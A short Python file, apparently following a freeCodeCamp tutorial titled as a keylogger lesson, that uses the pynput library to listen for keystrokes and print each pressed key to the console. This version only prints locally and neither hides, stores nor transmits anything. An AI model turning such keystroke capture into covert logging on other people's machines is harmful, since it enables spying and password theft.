# Youtube tut for "Create a keylogget with Python = Tutorial" 
# On freecodecamp.org

import pynput

from pynput.keyboard import Key, Listener

def on_press(key):
    print("{0} pressed".format(key))
 
def on_release(key): 
    pass

with Listener(on_press=on_press, on_release=on_release) as listener: 
    listener.join()

